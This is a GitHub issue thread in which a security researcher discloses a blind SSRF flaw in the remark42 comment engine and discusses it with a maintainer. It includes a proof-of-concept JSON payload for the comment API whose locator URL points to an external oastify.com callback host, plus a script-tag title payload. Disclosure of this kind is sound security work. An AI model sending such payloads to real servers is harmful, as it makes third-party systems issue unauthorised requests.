### **[jet-pentest](/jet-pentest)** commented [Oct 10, 2023](#issue-1934843567)

| Hi! I found an issue in remark42 engine. When field "title" is missing in comment request and attacker send a malicious URL which is a part of locator struct on POST request to `/api/v1/comment?site=<SITE_ID>`, it leads to Blind SSRF vulnerability. As example, malicious URL looks like this: {"text":"qweqwe","locator":{"site":"remark","url":"[https://j5pxshabxb5037lms6z182pkjbp4d01p.oastify.com"}}](https://j5pxshabxb5037lms6z182pkjbp4d01p.oastify.com%22%7D%7D) This malicious JSON in request to `/api/v1/comment?site=<SITE_ID>` leads to Blind SSRF [–°–Ω–∏–º–æ–∫ —ç–∫—Ä–∞–Ω–∞ 2023-10-10 –≤ 11 59 07](https://private-user-images.githubusercontent.com/71512502/273839711-f10ce363-e968-4a6d-a0e9-dd60c930caab.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MDgyNjQsIm5iZiI6MTczNjYwNzk2NCwicGF0aCI6Ii83MTUxMjUwMi8yNzM4Mzk3MTEtZjEwY2UzNjMtZTk2OC00YTZkLWEwZTktZGQ2MGM5MzBjYWFiLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE1MDYwNFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTgyNDZjZDM5NjRhZTg5Nzg0NDNhNmM5NzY4Y2MzMDA5YWRmZDNhOTNlOTI0MGUyZWY1MzFmZDVlNmFiMjgxNzImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.MyHl9WO9rF8IS6Q36mjpvUYfhB5HURBpv0xQYZmIs4s) As another way, malicious field "title", which should be fully cutted by sanitizer, also leads to blind SSRF. |

| Thank you for the report!  As another way, malicious field "title", which should be fully cutted by sanitizer, also leads to blind SSRF.  Could you please clarify this point? Title ~~is not sanitised now~~ is sanitised except for some HTML tags like `<b>` and `<a>` but I don't understand how does it lead to blind SSRF. |

[@paskal](https://github.com/paskal) Hi! In this case, a minimal payload that I was able to reproduce was: `<script>alert();</script>`. An sanitizer will fully clean "title" field. |

| Also, in my example, I was using a Burp Suite Collaborator as a part of Burp Suite. For development purposes, you may try to use it too. Another pay-free variant is <http://webhook.site/>. I hope it'll be helpful for you. |

| What's the problem with `<script>alert();</script>` being converted to a empty title? It's not a vulnerability for sure. [@paskal](https://github.com/paskal) Sure, but SSRF with non empty title was not working. I was highlighted this, because not only removing `title` triggers SSRF. It's will be sanitizer's result of work. Also, it doesn't work, if you'll send empty `title` field due initial checks. |
